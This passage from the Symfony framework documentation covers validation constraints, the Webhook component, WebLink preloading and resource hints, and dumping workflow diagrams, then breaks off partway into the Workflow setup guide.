                $metadata->addPropertyConstraint('genre', new Assert\Choice([
                    'choices' => ['fiction', 'non-fiction'],
                    'message' => 'Choose a valid genre.',
                ]));
            }
        }

.. _validation-default-option:

The options of a constraint can always be passed in as an array. Some constraints,
however, also allow you to pass the value of one, "*default*", option in place
of the array. In the case of the ``Choice`` constraint, the ``choices``
options can be specified in this way.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\Choice(['fiction', 'non-fiction'])]
            private string $genre;

            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            properties:
                genre:
                    - Choice: [fiction, non-fiction]
                # ...

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <property name="genre">
                    <constraint name="Choice">
                        <value>fiction</value>
                        <value>non-fiction</value>
                    </constraint>
                </property>

                <!-- ... -->
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            private string $genre;

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                // ...

                $metadata->addPropertyConstraint(
                    'genre',
                    new Assert\Choice(['fiction', 'non-fiction'])
                );
            }
        }

This is purely meant to make the configuration of the most common option of
a constraint shorter and quicker.

If you're ever unsure of how to specify an option, either check the namespace
``Symfony\Component\Validator\Constraints`` for the constraint or play it safe
by always passing in an array of options (the first method shown above).

Constraints in Form Classes
---------------------------

Constraints can be defined while building the form via the ``constraints`` option
of the form fields::

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder
            ->add('myField', TextType::class, [
                'required' => true,
                'constraints' => [new Length(['min' => 3])],
            ])
        ;
    }

.. _validator-constraint-targets:

Constraint Targets
------------------

Constraints can be applied to a class property (e.g. ``name``),
a getter method (e.g. ``getFullName()``) or an entire class. Property constraints
are the most common and easy to use. Getter constraints allow you to specify
more complex validation rules. Finally, class constraints are intended
for scenarios where you want to validate a class as a whole.

.. _validation-property-target:

Properties
~~~~~~~~~~

Validating class properties is the most basic validation technique. Symfony
allows you to validate private, protected or public properties. The next
listing shows you how to configure the ``$firstName`` property of an ``Author``
class to have at least 3 characters.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php

        // ...
        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\NotBlank]
            #[Assert\Length(min: 3)]
            private string $firstName;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            properties:
                firstName:
                    - NotBlank: ~
                    - Length:
                        min: 3

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <property name="firstName">
                    <constraint name="NotBlank"/>
                    <constraint name="Length">
                        <option name="min">3</option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            private string $firstName;

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('firstName', new Assert\NotBlank());
                $metadata->addPropertyConstraint(
                    'firstName',
                    new Assert\Length(['min' => 3])
                );
            }
        }

.. caution::

    The validator will use a value ``null`` if a typed property is uninitialized.
    This can cause unexpected behavior if the property holds a value when initialized.
    In order to avoid this, make sure all properties are initialized before validating them.

Getters
~~~~~~~

Constraints can also be applied to the return value of a method. Symfony
allows you to add a constraint to any private, protected or public method whose name starts with
"get", "is" or "has". In this guide, these types of methods are referred to
as "getters".

The benefit of this technique is that it allows you to validate your object
dynamically. For example, suppose you want to make sure that a password field
doesn't match the first name of the user (for security reasons). You can
do this by creating an ``isPasswordSafe()`` method, and then asserting that
this method must return ``true``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\IsTrue(message: 'The password cannot match your first name')]
            public function isPasswordSafe(): bool
            {
                // ... return true or false
            }
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            getters:
                passwordSafe:
                    - 'IsTrue': { message: 'The password cannot match your first name' }

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <getter property="passwordSafe">
                    <constraint name="IsTrue">
                        <option name="message">The password cannot match your first name</option>
                    </constraint>
                </getter>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addGetterConstraint('passwordSafe', new Assert\IsTrue([
                    'message' => 'The password cannot match your first name',
                ]));
            }
        }

Now, create the ``isPasswordSafe()`` method and include the logic you need::

    public function isPasswordSafe(): bool
    {
        return $this->firstName !== $this->password;
    }

.. note::

    The keen-eyed among you will have noticed that the prefix of the getter
    ("get", "is" or "has") is omitted in the mappings for the YAML, XML and PHP
    formats. This allows you to move the constraint to a property with the same
    name later (or vice versa) without changing your validation logic.

.. _validation-class-target:

Classes
~~~~~~~

Some constraints apply to the entire class being validated. For example,
the :doc:`Callback </reference/constraints/Callback>` constraint is a generic
constraint that's applied to the class itself. When that class is validated,
methods specified by that constraint are simply executed so that each can
provide more custom validation.

Validating Object With Inheritance
----------------------------------

When you validate an object that extends another class, the validator
automatically validates constraints defined in the parent class as well.

**The constraints defined in the parent properties will be applied to the child
properties even if the child properties override those constraints**. Symfony
will always merge the parent constraints for each property.

You can't change this behavior, but you can overcome it by defining the parent
and the child constraints in different :doc:`validation groups </validation/groups>`
and then select the appropriate group when validating each object.

Debugging the Constraints
-------------------------

Use the ``debug:validator`` command to list the validation constraints of a
given class:

.. code-block:: terminal

    $ php bin/console debug:validator 'App\Entity\SomeClass'

        App\Entity\SomeClass
        -----------------------------------------------------

        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+
        | Property      | Name                                             | Groups  | Options                                                    |
        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+
        | firstArgument | Symfony\Component\Validator\Constraints\NotBlank | Default | [                                                          |
        |               |                                                  |         |   "message" => "This value should not be blank.",          |
        |               |                                                  |         |   "allowNull" => false,                                    |
        |               |                                                  |         |   "normalizer" => null,                                    |
        |               |                                                  |         |   "payload" => null                                        |
        |               |                                                  |         | ]                                                          |
        | firstArgument | Symfony\Component\Validator\Constraints\Email    | Default | [                                                          |
        |               |                                                  |         |   "message" => "This value is not a valid email address.", |
        |               |                                                  |         |   "mode" => null,                                          |
        |               |                                                  |         |   "normalizer" => null,                                    |
        |               |                                                  |         |   "payload" => null                                        |
        |               |                                                  |         | ]                                                          |
        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+

You can also validate all the classes stored in a given directory:

.. code-block:: terminal

    $ php bin/console debug:validator src/Entity

Final Thoughts
--------------

The Symfony ``validator`` is a powerful tool that can be leveraged to
guarantee that the data of any object is "valid". The power behind validation
lies in "constraints", which are rules that you can apply to properties or
getter methods of your object. And while you'll most commonly use the validation
framework indirectly when using forms, remember that it can be used anywhere
to validate any object.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /validation/*

.. _Validator: https://github.com/symfony/validator
.. _JSR303 Bean Validation specification: https://jcp.org/en/jsr/detail?id=303
Webhook
=======

The Webhook component is used to respond to remote webhooks to trigger actions
in your application. This document focuses on using webhooks to listen to remote
events in other Symfony components.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/webhook

Usage in Combination with the Mailer Component
----------------------------------------------

When using a third-party mailer provider, you can use the Webhook component to
receive webhook calls from this provider.

Currently, the following third-party mailer providers support webhooks:

============== ============================================
Mailer Service Parser service name
============== ============================================
Brevo          ``mailer.webhook.request_parser.brevo``
MailerSend     ``mailer.webhook.request_parser.mailersend``
Mailgun        ``mailer.webhook.request_parser.mailgun``
Mailjet        ``mailer.webhook.request_parser.mailjet``
Postmark       ``mailer.webhook.request_parser.postmark``
Resend         ``mailer.webhook.request_parser.resend``
Sendgrid       ``mailer.webhook.request_parser.sendgrid``
============== ============================================

.. versionadded:: 7.1

    The support for ``Resend`` and ``MailerSend`` were introduced in Symfony 7.1.

.. note::

    Install the third-party mailer provider you want to use as described in the
    documentation of the :ref:`Mailer component <mailer_3rd_party_transport>`.
    Mailgun is used as the provider in this document as an example.

To connect the provider to your application, you need to configure the Webhook
component routing:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            webhook:
                routing:
                    mailer_mailgun:
                        service: 'mailer.webhook.request_parser.mailgun'
                        secret: '%env(MAILER_MAILGUN_SECRET)%'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:framework="http://symfony.com/schema/dic/symfony"
                   xsi:schemaLocation="http://symfony.com/schema/dic/services
                        https://symfony.com/schema/dic/services/services-1.0.xsd
                        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">
            <framework:config>
                <framework:webhook enabled="true">
                    <framework:routing type="mailer_mailgun">
                        <framework:service>mailer.webhook.request_parser.mailgun</framework:service>
                        <framework:secret>%env(MAILER_MAILGUN_SECRET)%</framework:secret>
                    </framework:routing>
                </framework:webhook>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use App\Webhook\MailerWebhookParser;
        use Symfony\Config\FrameworkConfig;
        return static function (FrameworkConfig $frameworkConfig): void {
            $webhookConfig = $frameworkConfig->webhook();
            $webhookConfig
                ->routing('mailer_mailgun')
                ->service('mailer.webhook.request_parser.mailgun')
                ->secret('%env(MAILER_MAILGUN_SECRET)%')
            ;
        };

In this example, we are using ``mailer_mailgun`` as the webhook routing name.
The routing name must be unique as this is what connects the provider with your
webhook consumer code.

The webhook routing name is part of the URL you need to configure at the
third-party mailer provider. The URL is the concatenation of your domain name
and the routing name you chose in the configuration (like
``https://example.com/webhook/mailer_mailgun``.

For Mailgun, you will get a secret for the webhook. Store this secret as
MAILER_MAILGUN_SECRET (in the :doc:`secrets management system
</configuration/secrets>` or in a ``.env`` file).

When done, add a :class:`Symfony\\Component\\RemoteEvent\\RemoteEvent` consumer
to react to incoming webhooks (the webhook routing name is what connects your
class to the provider).

For mailer webhooks, react to the
:class:`Symfony\\Component\\RemoteEvent\\Event\\Mailer\\MailerDeliveryEvent` or
:class:`Symfony\\Component\\RemoteEvent\\Event\\Mailer\\MailerEngagementEvent`
events::

    use Symfony\Component\RemoteEvent\Attribute\AsRemoteEventConsumer;
    use Symfony\Component\RemoteEvent\Consumer\ConsumerInterface;
    use Symfony\Component\RemoteEvent\Event\Mailer\MailerDeliveryEvent;
    use Symfony\Component\RemoteEvent\Event\Mailer\MailerEngagementEvent;
    use Symfony\Component\RemoteEvent\RemoteEvent;

    #[AsRemoteEventConsumer('mailer_mailgun')]
    class WebhookListener implements ConsumerInterface
    {
        public function consume(RemoteEvent $event): void
        {
            if ($event instanceof MailerDeliveryEvent) {
                $this->handleMailDelivery($event);
            } elseif ($event instanceof MailerEngagementEvent) {
                $this->handleMailEngagement($event);
            } else {
                // This is not an email event
                return;
            }
        }

        private function handleMailDelivery(MailerDeliveryEvent $event): void
        {
            // Handle the mail delivery event
        }

        private function handleMailEngagement(MailerEngagementEvent $event): void
        {
            // Handle the mail engagement event
        }
    }

Usage in Combination with the Notifier Component
------------------------------------------------

The usage of the Webhook component when using a third-party transport in
the Notifier is very similar to the usage with the Mailer.

Currently, the following third-party SMS transports support webhooks:

============ ==========================================
SMS service  Parser service name
============ ==========================================
Twilio       ``notifier.webhook.request_parser.twilio``
Vonage       ``notifier.webhook.request_parser.vonage``
============ ==========================================

For SMS webhooks, react to the
:class:`Symfony\\Component\\RemoteEvent\\Event\\Sms\\SmsEvent` event::

    use Symfony\Component\RemoteEvent\Attribute\AsRemoteEventConsumer;
    use Symfony\Component\RemoteEvent\Consumer\ConsumerInterface;
    use Symfony\Component\RemoteEvent\Event\Sms\SmsEvent;
    use Symfony\Component\RemoteEvent\RemoteEvent;

    #[AsRemoteEventConsumer('notifier_twilio')]
    class WebhookListener implements ConsumerInterface
    {
        public function consume(RemoteEvent $event): void
        {
            if ($event instanceof SmsEvent) {
                $this->handleSmsEvent($event);
            } else {
                // This is not an SMS event
                return;
            }
        }

        private function handleSmsEvent(SmsEvent $event): void
        {
            // Handle the SMS event
        }
    }

Creating a Custom Webhook
-------------------------

.. tip::

    Starting in `MakerBundle`_ ``v1.58.0``, you can run ``php bin/console make:webhook``
    to generate the request parser and consumer files needed to create your own
    Webhook.

.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
Asset Preloading and Resource Hints with HTTP/2 and WebLink
===========================================================

Symfony provides native support (via the `WebLink`_ component)
for managing ``Link`` HTTP headers, which are the key to improve the application
performance when using HTTP/2 and preloading capabilities of modern web browsers.

``Link`` headers are used in `HTTP/2 Server Push`_ and W3C's `Resource Hints`_
to push resources (e.g. CSS and JavaScript files) to clients before they even
know that they need them. WebLink also enables other optimizations that work
with HTTP 1.x:

* Asking the browser to fetch or to render another web page in the background;
* Making early DNS lookups, TCP handshakes or TLS negotiations.

Something important to consider is that all these HTTP/2 features require a
secure HTTPS connection, even when working on your local machine. The main web
servers (Apache, nginx, Caddy, etc.) support this, but you can also use the
`Docker installer and runtime for Symfony`_ created by Kévin Dunglas, from the
Symfony community.

Preloading Assets
-----------------

Imagine that your application includes a web page like this:

.. code-block:: html

    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>My Application</title>
        <link rel="stylesheet" href="/app.css">
    </head>
    <body>
        <main role="main" class="container">
            <!-- ... -->
        </main>
    </body>
    </html>

Following the traditional HTTP workflow, when this page is served browsers will
make one request for the HTML page and another request for the linked CSS file.
However, thanks to HTTP/2 your application can start sending the CSS file
contents even before browsers request them.

To do that, first install the WebLink component:

.. code-block:: terminal

    $ composer require symfony/web-link

Now, update the template to use the ``preload()`` Twig function provided by
WebLink. The `"as" attribute`_ is mandatory because browsers need it to apply
correct prioritization and the content security policy:

.. code-block:: html+twig

    <head>
        <!-- ... -->
        <link rel="preload" href="{{ preload('/app.css', { as: 'style' }) }}">
    </head>

If you reload the page, the perceived performance will improve because the
server responded with both the HTML page and the CSS file when the browser only
requested the HTML page.

.. note::

    You can preload an asset by wrapping it with the ``preload()`` function:

    .. code-block:: html+twig

        <head>
            <!-- ... -->
            <link rel="preload" href="{{ preload(asset('build/app.css')) }}">
        </head>

Additionally, according to `the Priority Hints specification`_, you can signal
the priority of the resource to download using the ``importance`` attribute:

.. code-block:: html+twig

    <head>
        <!-- ... -->
        <link rel="preload" href="{{ preload('/app.css', { as: 'style', importance: 'low' }) }}">
    </head>

How does it work?
~~~~~~~~~~~~~~~~~

The WebLink component manages the ``Link`` HTTP headers added to the response.
When using the ``preload()`` function in the previous example, the following
header was added to the response: ``Link </app.css>; rel="preload"; as="style"``
According to `the Preload specification`_, when an HTTP/2 server detects that
the original (HTTP 1.x) response contains this HTTP header, it will
automatically trigger a push for the related file in the same HTTP/2 connection.

Popular proxy services and CDNs including `Cloudflare`_, `Fastly`_ and `Akamai`_
also leverage this feature. It means that you can push resources to clients and
improve performance of your applications in production right now.

If you want to prevent the push but let the browser preload the resource by
issuing an early separate HTTP request, use the ``nopush`` option:

.. code-block:: html+twig

    <head>
        <!-- ... -->
        <link rel="preload" href="{{ preload('/app.css', { as: 'style', nopush: true }) }}">
    </head>

Resource Hints
--------------

`Resource Hints`_ are used by applications to help browsers when deciding which
resources should be downloaded, preprocessed or connected to first.

The WebLink component provides the following Twig functions to send those hints:

* ``dns_prefetch()``: "indicates an origin (e.g. ``https://foo.cloudfront.net``)
  that will be used to fetch required resources, and that the user agent should
  resolve as early as possible".
* ``preconnect()``: "indicates an origin (e.g. ``https://www.google-analytics.com``)
  that will be used to fetch required resources. Initiating an early connection,
  which includes the DNS lookup, TCP handshake, and optional TLS negotiation, allows
  the user agent to mask the high latency costs of establishing a connection".
* ``prefetch()``: "identifies a resource that might be required by the next
  navigation, and that the user agent *should* fetch, such that the user agent
  can deliver a faster response once the resource is requested in the future".
* ``prerender()``: "identifies a resource that might be required by the next
  navigation, and that the user agent *should* fetch and execute, such that the
  user agent can deliver a faster response once the resource is requested later".

The component also supports sending HTTP links not related to performance and
any link implementing the `PSR-13`_ standard. For instance, any
`link defined in the HTML specification`_:

.. code-block:: html+twig

    <head>
        <!-- ... -->
        <link rel="alternate" href="{{ link('/index.jsonld', 'alternate') }}">
        <link rel="preload" href="{{ preload('/app.css', { as: 'style', nopush: true }) }}">
    </head>

The previous snippet will result in this HTTP header being sent to the client:
``Link: </index.jsonld>; rel="alternate",</app.css>; rel="preload"; nopush``

You can also add links to the HTTP response directly from controllers and services::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\WebLink\GenericLinkProvider;
    use Symfony\Component\WebLink\Link;

    class BlogController extends AbstractController
    {
        public function index(Request $request): Response
        {
            // using the addLink() shortcut provided by AbstractController
            $this->addLink($request, (new Link('preload', '/app.css'))->withAttribute('as', 'style'));

            // alternative if you don't want to use the addLink() shortcut
            $linkProvider = $request->attributes->get('_links', new GenericLinkProvider());
            $request->attributes->set('_links', $linkProvider->withLink(
                (new Link('preload', '/app.css'))->withAttribute('as', 'style')
            ));

            return $this->render('...');
        }
    }

.. _`WebLink`: https://github.com/symfony/web-link
.. _`HTTP/2 Server Push`: https://tools.ietf.org/html/rfc7540#section-8.2
.. _`Resource Hints`: https://www.w3.org/TR/resource-hints/
.. _`Docker installer and runtime for Symfony`: https://github.com/dunglas/symfony-docker
.. _`"as" attribute`: https://w3c.github.io/preload/#as-attribute
.. _`the Priority Hints specification`: https://wicg.github.io/priority-hints/
.. _`the Preload specification`: https://www.w3.org/TR/preload/#server-push-http-2
.. _`Cloudflare`: https://blog.cloudflare.com/announcing-support-for-http-2-server-push-2/
.. _`Fastly`: https://docs.fastly.com/en/guides/http2-server-push
.. _`Akamai`: https://http2.akamai.com/
.. _`link defined in the HTML specification`: https://html.spec.whatwg.org/dev/links.html#linkTypes
.. _`PSR-13`: https://www.php-fig.org/psr/psr-13/
How to Dump Workflows
=====================

To help you debug your workflows, you can generate a visual representation of
them as SVG or PNG images. First, install any of these free and open source
applications needed to generate the images:

* `Graphviz`_, provides the ``dot`` command;
* `Mermaid CLI`_, provides the ``mmdc`` command;
* `PlantUML`_, provides the ``plantuml.jar`` file (which requires Java).

If you are defining the workflow inside a Symfony application, run this command
to dump it as an image:

.. code-block:: terminal

    # using Graphviz's 'dot' and SVG images
    $ php bin/console workflow:dump workflow-name | dot -Tsvg -o graph.svg

    # using Graphviz's 'dot' and PNG images
    $ php bin/console workflow:dump workflow-name | dot -Tpng -o graph.png

    # using PlantUML's 'plantuml.jar'
    $ php bin/console workflow:dump workflow_name --dump-format=puml | java -jar plantuml.jar -p  > graph.png

    # highlight 'place1' and 'place2' in the dumped workflow
    $ php bin/console workflow:dump workflow-name place1 place2 | dot -Tsvg -o graph.svg

    # using Mermaid.js CLI
    $ php bin/console workflow:dump workflow_name --dump-format=mermaid | mmdc -o graph.svg

The DOT image will look like this:

.. image:: /_images/components/workflow/blogpost.png
    :alt: A state diagram of the Symfony workflow created by DOT.

The Mermaid image will look like this:

.. image:: /_images/components/workflow/blogpost_mermaid.png
    :alt: A state diagram of the Symfony workflow created by Mermaid.

The PlantUML image will look like this:

.. image:: /_images/components/workflow/blogpost_puml.png
    :alt: A state diagram of the Symfony workflow created by PlantUML.

If you are creating workflows outside of a Symfony application, use the
``GraphvizDumper`` or ``StateMachineGraphvizDumper`` class to create the DOT
files and ``PlantUmlDumper`` to create the PlantUML files::

    // Add this code to a PHP script; for example: dump-graph.php
    $dumper = new GraphvizDumper();
    echo $dumper->dump($definition);

    # if you prefer PlantUML, use this code:
    # $dumper = new PlantUmlDumper();
    # echo $dumper->dump($definition);

.. code-block:: terminal

    # replace 'dump-graph.php' by the name of your PHP script
    $ php dump-graph.php | dot -Tsvg -o graph.svg
    $ php dump-graph.php | java -jar plantuml.jar -p  > graph.png

Styling
-------

You can use ``--with-metadata`` option in the ``workflow:dump`` command to include places, transitions and
workflow's metadata.

The DOT image will look like this :

.. image:: /_images/components/workflow/blogpost_metadata.png

.. note::

    The ``--with-metadata`` option only works for the DOT dumper for now.

.. note::

    The ``label`` metadata is not included in the dumped metadata, because it is used as a place's title.

You can use ``metadata`` with the following keys to style the workflow:

* for places:

  * ``bg_color``: a color;
  * ``description``: a string that describes the state.

* for transitions:

  * ``label``: a string that replaces the name of the transition;
  * ``color``: a color;
  * ``arrow_color``: a color.

Strings can include ``\n`` characters to display the contents in multiple lines.
Colors can be defined as:

* a color name from `PlantUML's color list`_;
* an hexadecimal color (both ``#AABBCC`` and ``#ABC`` formats are supported).

.. note::

    The Mermaid dumper does not support coloring the arrow heads
    with ``arrow_color`` as there is no support in Mermaid for doing so.

Below is the configuration for the pull request state machine with styling added.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                pull_request:
                    type: 'state_machine'
                    marking_store:
                        type: 'method'
                        property: 'currentPlace'
                    supports:
                        - App\Entity\PullRequest
                    initial_marking: start
                    places:
                        start: ~
                        coding: ~
                        test: ~
                        review:
                            metadata:
                                description: Human review
                        merged: ~
                        closed:
                            metadata:
                                bg_color: DeepSkyBlue
                    transitions:
                        submit:
                            from: start
                            to: test
                        update:
                            from: [coding, test, review]
                            to: test
                            metadata:
                                arrow_color: Turquoise
                        wait_for_review:
                            from: test
                            to: review
                            metadata:
                                color: Orange
                        request_change:
                            from: review
                            to: coding
                        accept:
                            from: review
                            to: merged
                            metadata:
                                label: Accept PR
                        reject:
                            from: review
                            to: closed
                        reopen:
                            from: closed
                            to: review

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >

            <framework:config>
                <framework:workflow name="pull_request" type="state_machine">
                    <framework:marking-store>
                        <framework:type>method</framework:type>
                        <framework:property>currentPlace</framework:property>
                    </framework:marking-store>

                    <framework:support>App\Entity\PullRequest</framework:support>

                    <framework:initial_marking>start</framework:initial_marking>

                    <framework:place>start</framework:place>
                    <framework:place>coding</framework:place>
                    <framework:place>test</framework:place>
                    <framework:place name="review">
                        <framework:metadata>
                            <framework:description>Human review</framework:description>
                        </framework:metadata>
                    </framework:place>
                    <framework:place>merged</framework:place>
                    <framework:place name="closed">
                        <framework:metadata>
                            <framework:bg_color>DeepSkyBlue</framework:bg_color>
                        </framework:metadata>
                    </framework:place>

                    <framework:transition name="submit">
                        <framework:from>start</framework:from>

                        <framework:to>test</framework:to>
                    </framework:transition>

                    <framework:transition name="update">
                        <framework:from>coding</framework:from>
                        <framework:from>test</framework:from>
                        <framework:from>review</framework:from>

                        <framework:to>test</framework:to>

                        <framework:metadata>
                            <framework:arrow_color>Turquoise</framework:arrow_color>
                        </framework:metadata>
                    </framework:transition>

                    <framework:transition name="wait_for_review">
                        <framework:from>test</framework:from>

                        <framework:to>review</framework:to>

                        <framework:metadata>
                            <framework:color>Orange</framework:color>
                        </framework:metadata>
                    </framework:transition>

                    <framework:transition name="request_change">
                        <framework:from>review</framework:from>

                        <framework:to>coding</framework:to>
                    </framework:transition>

                    <framework:transition name="accept">
                        <framework:from>review</framework:from>

                        <framework:to>merged</framework:to>

                        <framework:metadata>
                            <framework:label>Accept PR</framework:label>
                        </framework:metadata>
                    </framework:transition>

                    <framework:transition name="reject">
                        <framework:from>review</framework:from>

                        <framework:to>closed</framework:to>
                    </framework:transition>

                    <framework:transition name="reopen">
                        <framework:from>closed</framework:from>

                        <framework:to>review</framework:to>
                    </framework:transition>

                </framework:workflow>

            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $pullRequest = $framework->workflows()->workflows('pull_request');

            $pullRequest
                ->type('state_machine')
                ->supports(['App\Entity\PullRequest'])
                ->initialMarking(['start']);

            $pullRequest->markingStore()
                ->type('method')
                ->property('currentPlace');

            $pullRequest->place()->name('start');
            $pullRequest->place()->name('coding');
            $pullRequest->place()->name('test');
            $pullRequest->place()
                ->name('review')
                ->metadata(['description' => 'Human review']);
            $pullRequest->place()->name('merged');
            $pullRequest->place()
                ->name('closed')
                ->metadata(['bg_color' => 'DeepSkyBlue',]);

            $pullRequest->transition()
                ->name('submit')
                    ->from(['start'])
                    ->to(['test']);

            $pullRequest->transition()
                ->name('update')
                    ->from(['coding', 'test', 'review'])
                    ->to(['test'])
                    ->metadata(['arrow_color' => 'Turquoise']);

            $pullRequest->transition()
                ->name('wait_for_review')
                    ->from(['test'])
                    ->to(['review'])
                    ->metadata(['color' => 'Orange']);

            $pullRequest->transition()
                ->name('request_change')
                    ->from(['review'])
                    ->to(['coding']);

            $pullRequest->transition()
                ->name('accept')
                    ->from(['review'])
                    ->to(['merged'])
                    ->metadata(['label' => 'Accept PR']);

            $pullRequest->transition()
                ->name('reject')
                    ->from(['review'])
                    ->to(['closed']);

            $pullRequest->transition()
                ->name('accept')
                    ->from(['closed'])
                    ->to(['review']);
        };

The PlantUML image will look like this:

.. image:: /_images/components/workflow/pull_request_puml_styled.png
    :alt: A state diagram created by PlantUML with custom transition colors and descriptions.

.. _`Graphviz`: https://www.graphviz.org
.. _`Mermaid CLI`: https://github.com/mermaid-js/mermaid-cli
.. _`PlantUML`: https://plantuml.com/
.. _`PlantUML's color list`: https://plantuml.com/color
Workflow
========

Using the Workflow component inside a Symfony application requires knowing first
some basic theory and concepts about workflows and state machines.
:doc:`Read this article </workflow/workflow-and-state-machine>` for a quick overview.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the workflow feature before using it:

.. code-block:: terminal

    $ composer require symfony/workflow

Configuration
-------------

To see all configuration options, if you are using the component inside a
Symfony project run this command:

.. code-block:: terminal

    $ php bin/console config:dump-reference framework workflows

Creating a Workflow
-------------------

A workflow is a process or a lifecycle that your objects go through. Each
step or stage in the process is called a *place*. You also define *transitions*,
which describe the action needed to get from one place to another.

.. image:: /_images/components/workflow/states_transitions.png
    :alt: An example state diagram for a workflow, showing transitions and places.

A set of places and transitions creates a **definition**. A workflow needs
a ``Definition`` and a way to write the states to the objects (i.e. an
instance of a :class:`Symfony\\Component\\Workflow\\MarkingStore\\MarkingStoreInterface`.)

Consider the following example for a blog post. A post can have these places:
``draft``, ``reviewed``, ``rejected``, ``published``. You could define the workflow as
follows:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                blog_publishing:
                    type: 'workflow' # or 'state_machine'
                    audit_trail:
                        enabled: true
                    marking_store:
                        type: 'method'
                        property: 'currentPlace'
                    supports:
                        - App\Entity\BlogPost
                    initial_marking: draft
                    places:          # defining places manually is optional
                        - draft
                        - reviewed
                        - rejected
                        - published
                    transitions:
                        to_review:
                            from: draft
                            to:   reviewed
                        publish:
                            from: reviewed
                            to:   published
                        reject:
                            from: reviewed
                            to:   rejected

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
            https://symfony.com/schema/dic/services/services-1.0.xsd
            http://symfony.com/schema/dic/symfony
            https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <!-- or type="state_machine" -->
                <framework:workflow name="blog_publishing" type="workflow">
                    <framework:audit-trail enabled="true"/>
                    <framework:marking-store type="single_state">
